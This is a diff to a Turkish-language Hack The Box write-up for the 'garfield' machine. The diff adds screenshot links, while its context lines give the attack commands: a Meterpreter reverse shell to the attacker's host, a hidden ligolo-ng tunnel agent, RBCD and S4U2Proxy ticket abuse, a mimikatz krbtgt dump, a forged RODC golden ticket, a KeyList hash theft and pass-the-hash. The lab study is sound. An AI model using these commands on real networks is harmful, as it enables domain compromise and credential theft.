@@ -127,6 +127,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 10.10.17.90
 set LPORT 443
 run 
+![msfconsole](images/13-payload-meterpreter.png)
 
 Tetiklenmesi için;
 
@@ -142,6 +143,7 @@ Logon Script Hijack başarılı - l.wilson kullanıcı bağlamında kod çalış
 10- İç Ağ Keşfi(ifconfig)
 
 meterpreter > ifconfig
+![ifconfig](images/14-meterpreter-ifconfig.png)
 
 Interface 1 --> 127.0.0.1 --> Loopback 
 Interface 7 --> 10.129.244.207 --> Ana HTB ağı 
@@ -161,6 +163,7 @@ Kritik bulgu: 192.168.100.1 DC01'in bir Hyper-V host olduğunu ve 192.168.100.0/
 meterpreter > shell
  
 C:\Windows\system32> powershell.exe
+![powershell](images/15-powershell.png)
 
 Meterpreter yerine PowerShell'e geçmemizin sebebi: Set-ADAccountPassword, Get-ADUser gibi Active Directory PowerShell modüllerini kullanabilmek.
 
@@ -172,6 +175,7 @@ Meterpreter yerine PowerShell'e geçmemizin sebebi: Set-ADAccountPassword, Get-A
 $pw = ConvertTo-SecureString 'Grrard123' -AsPlainText -Force 
 
 Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $pw -Reset -Server DC01.garfield.htb
+![password](images/16-password-change.png)
 
 l.wilson, l.wilson üzerinde ForceChangePassword/parola sıfırlama hakkına sahip olduğunu gördük.
 
@@ -186,6 +190,7 @@ evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'Grrard123'
 garfield\l.wilson_adm
 
 type C:\Users\l.wilson_adm\Desktop\user.txt
+![user.txt](images/17-user.txt.png)
 
 
 
@@ -194,6 +199,7 @@ type C:\Users\l.wilson_adm\Desktop\user.txt
 14- Grup Üyeliği Kontrolü
 
 whoami /groups
+![whoami](images/18-groups-.png)
 
 l.wilson_adm ile Evil-WinRM oturumu üzerinden mevcut grup üyeliklerini kontrol ediyoruz. Bu noktada dikkat çeken grup GARFIELD\Tier1 henüz RODC Administrators grubunda değiliz. 
 
@@ -208,8 +214,11 @@ wget https://github.com/shadow1ng/fscan/releases/download/v2.2.1/fscan_2.2.1_win
 evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'Grrard123'
 
 upload /home/kali/fscan.exe fscan.exe
+![fscan](images/19-fscan.png)
 
 .\fscan.exe -h 192.168.100.0/24
+![fscan](images/20-fscan2.png)
+![fscan](images/21-fscan3.png)
 
 [*] 192.168.100.1:445    microsoft-ds [Product:Microsoft Windows SMB2]
 [-] SMBInfo 192.168.100.1:445  [Windows 10 (Build 17763)] DC01 SMBv2
@@ -232,6 +241,7 @@ SMB ve NetInfo bilgileriyle doğrulandı.
 17- İç ağ /etc/hosts kaydı + Host Ayakta mı ?
 
 echo "192.168.100.2 RODC.garfield.htb" | sudo tee -a /etc/hosts
+![echo](images/21-echo.png)
 
 
 
@@ -245,6 +255,7 @@ sudo ./proxy -selfcert
 ligolo-ng >> ifcreate --name ligolo
 
 ligolo-ng >> route_add --name ligolo --route 192.168.100.0/24
+![ligolo](images/22-ligolo-ng.png)
 
 RODC01 (192.168.100.2), dışarıdan doğrudan erişilemeyen izole bir iç ağda. Ligolo-ng ile saldırgan makinede bir tünel arayüzü oluşturup, bu iç ağa (192.168.100.0/24) route ekliyoruz.
 
@@ -259,14 +270,17 @@ mkdir C:\Temp
 cd C:\Temp
 
 upload /home/kali/ligolo-ng/agent.exe agent.exe
+![agent](images/23-agent.exe.png)
 
 Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.17.90:11601 -ignore-cert" -WindowStyle Hidden
 
 ligolo-ng >> session
 
 ? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.244.207:63639 - 00155d0bdd00   not: 1'i seçiyoruz.
+![ligolo](images/24-ligolo-ng2.png)
 
 [Agent : GARFIELD\l.wilson_adm@DC01] » start
+![ligolo](images/25-ligolo-ng3.png)
 
 l.wilson_adm oturumu üzerinden ligolo-ng agent'ını DC01'e yükleyip çalıştırıyoruz. agent, saldırgan makinedeki proxy'ye bağlanıyor ve DC01 üzerinden 192.168.100.0/24 ağına tünel açıyor.
 
@@ -278,6 +292,7 @@ RODC Administrators Grup Üyeliği ve RBCD Saldırısı
 18- l.wilson_adm'ı RODC Administrators Grubuna Ekleme 
 
 bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Grrard123' add groupMember "RODC Administrators" l.wilson_adm
+![bloodyAD](images/26-blood.png)
 
 l.wilson_adm kendini RODC Administrators grubuna ekleyebiliyor ve bu grup üzerinde AddMember hakkı var.
 
@@ -299,6 +314,7 @@ Domain'in varsayılan ms-DS-MachineAccountQuota ayarı herhangi bir authenticate
 20- RBCD (Resource-Based Constrained Delegation) Ayarlama 
 
 bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Grrard123' add rbcd 'RODC01$' 'DC02$'
+![bloodyAD](images/27-blood3.png)
 
 RODC01$'in msDS-AllowedToActOnBehalfOfOtherIdentity özelliğine DC02$'i yazıyoruz. Bu, DC02$'in RODC01 üzerinde herhangi bir kullanıcıyı impersonate edebilmesini sağlıyor.
 
@@ -318,6 +334,7 @@ Kerberos, saat farkına karşı hassas olduğu için saldırgan makinenin saatin
 22- S4U2Proxy(Service for User to Proxy) ile Administrator Bileti Alma 
 
 python3 /usr/share/doc/python3-impacket/examples/getST.py GARFIELD.HTB/'DC02$':'ardgrr123' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207
+![getst](images/28-ntpdategettgt.png)
 
 DC02$ kimlik bilgileriyle, RBCD hakkını kullanarak Administrator adına RODC01 üzerinde cifs servisi için bir TGS bileti talep ediyoruz.
 
@@ -330,6 +347,7 @@ DC02$ kimlik bilgileriyle, RBCD hakkını kullanarak Administrator adına RODC01
 export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
 
 python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k -no-pass GARFIELD.HTB/Administrator@RODC01.garfield.htb
+![smbclient](images/29-smbclient.png)
 
 Daha önce S4U2Proxy ile aldığımız Administrator@cifs/RODC01 biletini KRB5CCNAME ortam değişkenine set edip, impacket smbclient.py ile pass-the-ticket yöntemiyle RODC01'e Administrator olarak bağlanıyoruz.
 
@@ -344,6 +362,7 @@ cd Windows/Temp
 put /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 put /home/kali/impacket/Rubeus.exe
 ls
+![smb](images/30-smb.png)
 
 RODC01'de Administrator context'inde dosya yazabildiğimizi doğruluyoruz. RODC krbtgt hash'ini dump etmek (mimikatz) ve Golden Ticket üretmek (Rubeus) için ihtiyacımız olan araçlar yüklü mü ona bakıyoruz. Eğer yüklü değilse hedefe yüklüyoruz.
 
@@ -353,6 +372,8 @@ RODC01'de Administrator context'inde dosya yazabildiğimizi doğruluyoruz. RODC 
 25- psexec ile RODC01'de SYSTEM Shell Alma
 
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass GARFIELD.HTB/Administrator@RODC01.garfield.htb
+![mimikatz](images/31-mimikatz.exe.png)
+
 smbclient.py dosya transferi sağladığı için, mimikatz'ı çalıştırabilmek üzere psexec.py ile aynı kerberos bileti kullanılarak RODC01 üzerinde tam interaktif bir SYSTEM shell elde ediyoruz.
 
 
@@ -364,6 +385,8 @@ smbclient.py dosya transferi sağladığı için, mimikatz'ı çalıştırabilme
 cd \Windows\Temp
 
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245"
+![mimikatz](images/31-mimikatz.exe.png)
+![mimikatz](images/33-mimikatz.exe3.png)
 
 RODC01'de SYSTEM yetkisiyle, RODC'ye özel krbtgt_8245 hesabının kimlik bilgilerini LSA'dan dump ediyoruz. Çıktının Kerberos-Newer-Keys bölümünde asıl ihtiyacımız olan değer çıkıyor;
 aes256_hmac : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
@@ -380,6 +403,7 @@ exit diyip çıkıyoruz.
 bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Grrard123' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
 
 bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Grrard123' set object 'RODC01$' msDS-NeverRevealGroup
+![bloodyAD](images/34-bloodyAD-ntpdate.png)
 
 RODC01'in Administrator hesabının credential'ını cache'lemesine (reveal 
 etmesine) izin veriyoruz. Bu adım olmadan, sonraki KeyList Attack denemesi 
@@ -396,6 +420,8 @@ DC'den key list talep edemez.
 28- RODC Golden Ticket Oluşturma (Rubeus)
 
 Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /sdelay:3600
+![rubeus](images/35-rubeus2.png)
+![rubeus](images/37-rubeus-kirbi.png)
 
 krbtgt_8245'in AES256 anahtarıyla, Administrator (RID: 500) için sahte bir TGT (Golden Ticket) forge ediyoruz. /rodcNumber:8245 parametresi, biletin bu RODC'ye özel krbtgt tarafından imzalandığını belirtiyor.
 
@@ -411,6 +437,7 @@ krbtgt_8245'in AES256 anahtarıyla, Administrator (RID: 500) için sahte bir TGT
 29- asktgs ile Gerçek DC'den KeyList Talebi 
 
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:administrator_2026_09_26_01_29_56_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
+![rubeus](images/36-rubeus3.png)
 
 RODC imzalı Golden Ticket'ı kullanarak, gerçek DC01'e /KeyList parametresiyle bir TGS talebi gönderiyoruz. Bu teknik; DC01'in bilete güvenip yanıt olarak kullanıcının gerçek anahtar meteryalini sızdırmasından faydalanıyor.
 Administrator'ın gerçek NTLM hash'i elde edildi -->  EE238F6DEBC752010428F20875B092D5
@@ -429,6 +456,7 @@ evil-winrm -i DC01.garfield.htb -u Administrator -H EE238F6DEBC752010428F20875B0
 
 whoami
 garfield\administrator
+![WinRM](images/38-WinRM-administrators.png)
 
 Elde ettiğimiz gerçek NTLM hash'iyle, gerçek DC01'e doğrudan Administrator olarak bağlanıyoruz.
 
@@ -442,6 +470,7 @@ Elde ettiğimiz gerçek NTLM hash'iyle, gerçek DC01'e doğrudan Administrator o
 31- root.txt Flag
 
 type C:\Users\Administrator\Desktop\root.txt
+![root.txt](images/39-root.txt.png)
 
 makineyi düşürüyoruz!
 
